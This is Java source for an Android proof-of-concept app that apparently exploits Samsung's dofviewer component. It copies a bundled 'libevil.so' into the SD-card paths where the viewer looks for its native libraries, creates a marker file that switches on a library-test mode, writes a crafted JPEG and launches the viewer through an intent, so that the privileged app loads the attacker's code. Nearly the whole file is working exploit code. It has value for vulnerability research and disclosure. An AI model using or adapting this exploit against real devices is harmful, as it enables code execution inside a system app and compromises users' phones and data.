package poc.app;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.widget.Toast;

import com.samsung.android.app.dofviewer.data.FocusShotMetaInfo;

import org.apache.commons.io.IOUtils;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        createPayloads();

        Intent i = new Intent("com.samsung.android.app.dofviewer");
        i.putExtra("IMAGE_FILE_PATH", writeImageFile().getAbsolutePath());
        startActivity(i);
    }

    private File writeImageFile() {
        try {
            File outFile = new File("/sdcard/DCIM/Camera/payload.jpg");
            outFile.getParentFile().mkdirs();

            InputStream inputStream = getAssets().open("image.jpg");
            OutputStream outputStream = new FileOutputStream(outFile);
            IOUtils.copy(inputStream, outputStream);
            inputStream.close();
            outputStream.close();

            return outFile;
        } catch (Throwable th) {
            throw new RuntimeException(th);
        }
    }

    private void createPayloads() {
        try {
            File root = new File("/sdcard/DCIM/1000/lib/");
            root.mkdirs();

            // make isLibraryTest() == true
            File libraryTestFile = new File("/sdcard/DCIM/1000/1000.library");
            new FileOutputStream(libraryTestFile).close();

            // write libraries
            String[] files = new String[] {
                    "dualcam_refocus_gallery_31_jni",
                    "dualcam_refocus_gallery_31",
                    "dualcam_refocus_gallery",
                    "dualcam_refocus_gallery_jni",
                    "dualcam_refocus_gallery_aser",
                    "dualcam_refocus_gallery_aser_jni",
                    "dualcam_refocus_gallery_beyond",
                    "dualcam_refocus_gallery_beyond_jni",
                    "dualcam_refocus_gallery_wt_beyond",
                    "dualcam_refocus_gallery_wt_beyond_jni",
                    "dualcam_refocus_gallery_front_beyond",
                    "dualcam_refocus_gallery_front_beyond_jni",
                    "dualcam_refocus_gallery_26",
                    "dualcam_refocus_gallery_26_jni",
                    "dualcam_refocus_gallery_36",
                    "dualcam_refocus_gallery_36_jni",
                    "dualcam_refocus_gallery_39",
                    "dualcam_refocus_gallery_39_jni",
                    "dualcam_refocus_gallery_43",
                    "dualcam_refocus_gallery_43_jni"
            };
            for (String file : files) {
                File libFile = new File(root, "lib" + file + ".so");
                InputStream inputStream = getAssets().open("libevil.so");
                OutputStream outputStream = new FileOutputStream(libFile);
                IOUtils.copy(inputStream, outputStream);
                inputStream.close();
                outputStream.close();
            }
        } catch (Throwable th) {
            Toast.makeText(this, "Cannot create files. Did you grant SD card permissions?", Toast.LENGTH_LONG).show();
            throw new RuntimeException(th);
        }
    }

    private void addPayloadToJpeg(File file) {
        byte[] focusShotMetaInfo = getFocusShotMetaInfo();
        try {
            Class semExtendedFormatClass = Class.forName("com.samsung.android.media.SemExtendedFormat");
            Method addDataMethod = semExtendedFormatClass.getDeclaredMethod("addData", File.class, String.class, byte[].class, int.class, int.class);
            addDataMethod.invoke(null, file, "Dual_Relighting_Bokeh_Info", focusShotMetaInfo, 3024, 1);
            addDataMethod.invoke(null, file, "DualShot_DepthMap_1", focusShotMetaInfo, 3024, 1);
            addDataMethod.invoke(null, file, "DualShot_1", focusShotMetaInfo, 3024, 1);
        } catch (Throwable th) {
            throw new RuntimeException(th);
        }
    }

    private byte[] getFocusShotMetaInfo() {
        FocusShotMetaInfo info = new FocusShotMetaInfo();
        info.mDofHeader2.mDepthSolutionProvider = 3;
        return info.generateMetadata();
    }
}